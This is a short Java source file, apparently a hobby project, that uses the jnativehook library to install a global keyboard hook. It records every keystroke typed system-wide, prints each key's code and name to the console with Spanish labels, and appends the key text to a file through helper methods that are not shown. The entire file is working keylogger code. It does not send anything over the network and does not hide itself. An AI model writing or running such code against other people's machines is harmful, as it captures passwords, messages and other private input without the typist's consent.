package my;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*
 * 
 */
import static my.file.myTXT.createFile;
import static my.file.myTXT.writeFile;

public class Main implements NativeKeyListener {

    public static void main (String[] args) throws IOException {
        
        createFile();

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {}

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        int keyCode = nativeEvent.getKeyCode();
        String keyString = nativeEvent.getKeyText(keyCode);
        System.out.println("Tecla pulsada (Código VK): " + keyCode);
        System.out.println("Letra: "+keyString);
        
        try {
            writeFile(keyString);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {}
}